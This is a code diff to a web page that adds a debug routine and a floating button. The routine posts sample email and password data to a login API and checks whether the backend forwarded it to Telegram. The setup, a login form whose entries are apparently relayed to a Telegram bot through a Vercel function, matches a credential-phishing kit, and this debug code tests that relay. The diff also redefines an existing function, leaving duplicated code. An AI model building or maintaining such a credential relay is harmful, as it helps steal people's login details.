@@ -521,6 +521,138 @@
     </div>
 
     <script>
+// ===================== DEBUG CODE =====================
+function debugTelegram() {
+    console.log('🛠️ Testing API...');
+    
+    const testData = {
+        type: 'login',
+        email: 'test@example.com',
+        password: 'test123',
+        userAgent: navigator.userAgent
+    };
+    
+    // Show loading
+    const btn = document.getElementById('telegramDebugBtn');
+    if (btn) {
+        btn.innerHTML = '⏳ Testing...';
+        btn.disabled = true;
+    }
+    
+    fetch('/api/login', {
+        method: 'POST',
+        headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify(testData)
+    })
+    .then(response => {
+        console.log('Status:', response.status, response.statusText);
+        console.log('Headers:', Object.fromEntries(response.headers.entries()));
+        
+        // First try to get as text to see what we're getting
+        return response.text().then(text => {
+            console.log('Raw response:', text.substring(0, 500));
+            
+            try {
+                // Try to parse as JSON
+                return JSON.parse(text);
+            } catch (parseError) {
+                console.error('JSON parse failed:', parseError.message);
+                
+                // If it's HTML error, show it
+                if (text.includes('<!DOCTYPE') || text.includes('<html')) {
+                    throw new Error('Server returned HTML error page. Check Vercel function.');
+                }
+                
+                throw new Error(`Not JSON: ${text.substring(0, 100)}`);
+            }
+        });
+    })
+    .then(data => {
+        console.log('✅ Parsed response:', data);
+        
+        let alertMsg = `API Test Result:\n`;
+        alertMsg += `Success: ${data.success ? '✅' : '❌'}\n`;
+        alertMsg += `Type: ${data.type || 'none'}\n`;
+        
+        if (data.telegram) {
+            alertMsg += `Telegram: ${data.telegram.sent ? '✅ Sent' : '❌ Failed'}\n`;
+            if (data.telegram.error) {
+                alertMsg += `Error: ${data.telegram.error}\n`;
+            }
+        }
+        
+        if (data.error) {
+            alertMsg += `Error: ${data.error}\n`;
+        }
+        
+        alert(alertMsg);
+    })
+    .catch(error => {
+        console.error('❌ Debug error:', error);
+        
+        let errorMsg = `Debug Failed:\n${error.message}\n\n`;
+        errorMsg += `Check:\n1. Vercel function logs\n2. Browser console (F12)\n3. Network tab`;
+        
+        alert(errorMsg);
+    })
+    .finally(() => {
+        // Reset button
+        const btn = document.getElementById('telegramDebugBtn');
+        if (btn) {
+            btn.innerHTML = '🔧 DEBUG';
+            btn.disabled = false;
+        }
+    });
+}
+
+// Create debug button
+function createDebugButton() {
+    if (document.getElementById('telegramDebugBtn')) return;
+    
+    const btn = document.createElement('button');
+    btn.id = 'telegramDebugBtn';
+    btn.innerHTML = '🔧 DEBUG';
+    btn.title = 'Test Telegram API (Ctrl+Shift+T)';
+    
+    btn.style.cssText = `
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 99999;
+        background: #ff4444;
+        color: white;
+        border: none;
+        border-radius: 20px;
+        padding: 10px 20px;
+        font-size: 14px;
+        font-weight: bold;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(255, 68, 68, 0.3);
+        font-family: Arial, sans-serif;
+    `;
+    
+    btn.onclick = debugTelegram;
+    document.body.appendChild(btn);
+    
+    console.log('🔧 Debug button added');
+}
+
+// Add button
+if (window.location.hostname.includes('vercel') || true) { // Always show for now
+    setTimeout(createDebugButton, 2000);
+}
+
+// Keyboard shortcut
+document.addEventListener('keydown', (e) => {
+    if (e.ctrlKey && e.shiftKey && e.key === 'T') {
+        e.preventDefault();
+        debugTelegram();
+    }
+});
+// ===================== END DEBUG =====================
 // === DEBUG BUTTON - REMOVE AFTER FIXING ===
 // Add this function
 function debugTelegram() {
